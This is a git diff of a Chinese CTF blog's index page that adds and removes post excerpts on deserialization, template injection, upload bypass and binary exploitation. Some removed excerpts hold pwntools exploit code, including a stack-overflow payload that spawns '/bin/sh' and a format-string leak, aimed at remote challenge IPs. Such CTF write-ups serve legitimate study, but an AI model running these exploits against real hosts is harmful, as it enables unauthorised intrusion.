@@ -141,6 +141,200 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/">
+        <p class="h4 index-header">python反序列化漏洞浅析</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">0x01 前言数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接口处。
+主要作用：能够让数据在存储或者传输的时候能够单单只用string的类型去表述相对复杂的数据结构，方便应用所见即所得，直接进行数据交流处理。
+引发的安全问题：PHP的unserialize/__wakeup()漏洞、struts的ognl、xml解析的一系列漏洞、Ruby on Rails的xml/yaml，本文即将要讲的Python pickle/cPickle库的反序列化漏洞
+此类漏洞常会导致RCE，原因：和我们所提到的应用场景有关。语言需要从string去解析出自己的语言数据结构，必然要去从这个string中做固定格式的解析，然后在内部把解析出来的结果去eval一下；或者，为了保证解析出来的内容为被序列化时候的Object状态，要调用一下状态保存的函数wakeup
+0x02 Pickle模块
+pickle模块用来对Python对象执行序列化和反序列化。Python的任何对象都可以通过它永久保存到硬盘文件。Pickle实际上是先把Python对象（lis</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-09&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/04/06/Javaweb%E5%88%A9%E7%94%A8/">
+        <p class="h4 index-header">WEB-INF</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码[https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java](https://buuoj.cn/challenges#[RoarCTF 2019]Easy Java)首先看到一个页面,点击下help看看啥情况。
+发现输出一串
+java.io.FileNotFoundException:{help.docx}可能是报错信息，打开Brup截取请求信息
+GET /Download?filename=help.docx HTTP/1.1
+Host: a6360be7-edf9-4caa-9461-3f2c7a89df9e.node3.buuoj.cn
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xm</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-06&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/">
+        <p class="h4 index-header">【极客大挑战2019】PHP</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">这一题有两个地方卡住我了，第一个是没有想到备份名叫www.zip.第二个是public、protected与private在序列化时的区别。于是在url栏中输入www.zip得到网站源码，发现flag.php进行提交，错误。观看源码：index.php
+&lt;?php
+include &#39;class.php&#39;;
+$select = $_GET[&#39;select&#39;];
+$res=unserialize(@$select);
+?&gt;发现了关键代码，考的应该是反序列化漏洞，去看class.phpclass.php:
+&lt;?php
+ include &#39;flag.php&#39;;
+  error_reporting(0);
+  class Name{
+    private $username = &#39;nonono&#39;;
+    private $password = &#39;yesyes&#39;;
+
+    public function __construct($username,$password){
+        $thi</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-02&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/">
+        <p class="h4 index-header">上传绕过  .user.ini</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">今天做了一题是BUUCTF上的checkin一道文件上传题，题目首先对文件内容进行了过滤，过滤了</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-28&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/03/18/easy-calc/">
+        <p class="h4 index-header">easy calc</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">https://www.cnblogs.com/chrysanthemum/p/11757363.html
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-18&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/03/15/easy-tornado/">
+        <p class="h4 index-header">easy_tornado</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">welcome.txt的页面提示render，就想到了模板注入，flag.txt中告诉了flag文件的位置，hint.txt提示md5(cookie_secret+md5(filename))。
+就是说要通过模板注入找到cookie_secret,然后编写python脚本将flag_name进行md5加密，最后总体加密。同时观察hint.txt的url发现
+file?filename=/hints.txt&amp;filehash=c4d9e17f8cdc1e065a1af55625ffca16 那么最终就是：
+
+
+file?filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))
+
+
+ python脚本：
+ import hashlib
+
+def hash(value):
+    md5 = hashlib.md5(value)
+    md5.update(value)
+    result = md5.hexdigest()
+    return result
+
+def jiami():
+   </div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-15&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/03/10/%E5%85%B3%E4%BA%8Ephp%E7%9A%84session-serialize-handler%E7%9A%84%E9%97%AE%E9%A2%98/">
         <p class="h4 index-header">关于php的session.serialize_handler的问题</p>
         
@@ -263,199 +457,6 @@ intval($req[“number”])=intval(strrev($req[“num</div>
       <div>
         
           <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-27&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/02/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn1/">
-        <p class="h4 index-header">攻防世界pwn1</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">https://www.cnblogs.com/lxy8584099/p/11887235.html
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-15&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cstack2/">
-        <p class="h4 index-header">攻防世界stack2</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">https://www.baidu.com/link?url=-3Q6-OV7phmsr2vIhz1F6gc28uCq2Df3acVV7copeZK-3AMH0Z5yrLieNixXsm7qz460CyNrc2eZKTcxElefoRhr5d1XDuzzpjIFpsJejTC&amp;wd=&amp;eqid=c16734cb001ae96e000000065e425ba0
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-11&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/02/10/CG-CTF-Stack-Overflow/">
-        <p class="h4 index-header">CG-CTF Stack Overflow</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">Stack Overflow先执行一下程序。通过观察可以从message里面找溢出点，发现第一个数组A长度为40但是可以输入60。并且n就在A数组的下面，因此我们可以通过溢出修改n的长度，并且写了/bin/sh下面是exp；
-from pwn import *
-
-re = remote(&#39;182.254.217.142&#39;,10001)
-
-fgets_plt = 0x080483D0
-data_addr = 0x0804A024
-re.sendline(&#39;1&#39;)
-
-payload1 = &#39;a&#39;*0x28 + p32(0x60) +&#39;/bin/sh&#39;
-
-re.sendline(payload1)
-
-payload2 = &#39;a&#39;*0x30 + &#39;aaaa&#39; + p32(0x080483f0) + &#39;aaaa&#39; +p32(0x0804A0AD)
-
-re.sendline(payload2)
-re.interactive()</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-10&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cforgot/">
-        <p class="h4 index-header">攻防世界forgot</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">forgot首先检查一下文件
-Arch:     i386-32-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x8048000)可以确定的是栈上面的变量覆盖，但是覆盖地址的时候需要注意*(&amp;v3 + –v14)这个式子，我们需要把函数地址放到这个地址上面(&amp;v3是栈上面的地址，其计算是按照字节来计算而不是位，所以做的时候要注意计算的答案)。由于v14的初始值为1，并且里面正则判断的时候没有关于大写字符的判断，我们就可以直接写入大写字符覆盖v2，并将v3覆盖为我们需要的函数的地址，就可以拿到flag。关注这个循环里面的内容，里面相当于正则表达式的判断，但是你仔细分析里switch中的函数时，可以发现没有判断大写字符的地方，我们可以注入大写字符，来达到不改变v14的值的效果。
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-08&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/02/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMary-Morton/">
-        <p class="h4 index-header">攻防世界Mary_Morton</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">https://www.cnblogs.com/gaonuoqi/p/11760970.html
-Welcome to the battle ! 
-[Great Fairy] level pwned 
-Select your weapon 
-1. Stack Bufferoverflow Bug 
-2. Format String Bug 
-3. Exit the battle 
-2
-aaaa-%x-%x-%x-%x-%x-%x-%x-%x
-aaaa-451173d0-7f-d652c260-0-0-61616161-252d7825-2d78252d可以看见偏移量是6个字节。又因为0x90-0x8=0x88,0x88/8+6=23.故exp：
-from pwn import *
-r=remote(&#39;111.198.29.45&#39;,53501)
-
-r.recvuntil(&#39;3. Exit the battle&#39;)
-r.sendline(&#39;2&#39;)
-
-r.sendline(&#39;%23$p&#39;)
-
-r.recvuntil(&#39;0</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-08&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/02/03/XCTF-int-overflow/">
-        <p class="h4 index-header">XCTF int_overflow</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">https://www.52pojie.cn/thread-1032448-1-1.html
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-03&nbsp;&nbsp;
         
         
         
